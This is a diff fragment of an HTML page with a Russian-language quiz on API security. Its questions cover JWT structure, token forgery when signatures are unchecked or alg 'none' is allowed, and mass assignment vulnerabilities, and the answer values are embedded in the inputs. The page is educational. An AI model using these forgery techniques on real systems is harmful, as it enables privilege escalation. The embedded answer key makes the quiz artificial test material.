+                <label><input type="radio" name="apiQ1" value="1"> Header (Заголовок), Payload (Полезная нагрузка), Signature (Подпись).</label>
+                <label><input type="radio" name="apiQ1" value="0"> Логин, Пароль и Номер телефона.</label>
+                <label><input type="radio" name="apiQ1" value="2"> Монитор, Клавиатура и Мышь.</label>
+
+                <p><b>2. Что произойдет, если сервер не проверяет криптографическую подпись JWT-токена или разрешает алгоритм "alg": "none"?</b></p>
+                <label><input type="radio" name="apiQ2" value="0"> Браузер автоматически закроется.</label>
+                <label><input type="radio" name="apiQ2" value="1"> Атакующий сможет вручную изменить данные в Payload (например, прописать role: "admin") и сервер примет поддельный токен как настоящий.</label>
+                <label><input type="radio" name="apiQ2" value="2"> Скорость интернета вырастет в два раза.</label>
+
+                <p><b>3. Как называется уязвимость API, когда сервер слепо сохраняет в базу данных все переданные в JSON-запросе поля (например, is_admin: true), которые пользователь не должен был менять?</b></p>
+                <label><input type="radio" name="apiQ3" value="1"> Mass Assignment (Массовое присвоение / BOPLA)</label>
+                <label><input type="radio" name="apiQ3" value="0"> ARP Spoofing</label>
+                <label><input type="radio" name="apiQ3" value="2"> Defragmentation</label>
+
+                <button type="submit">Проверить ответы</button>
+            </form>
+        </article>
+    </section>
+
+</main>
+
+<script src="script.js"></script>
+</body>
+</html>
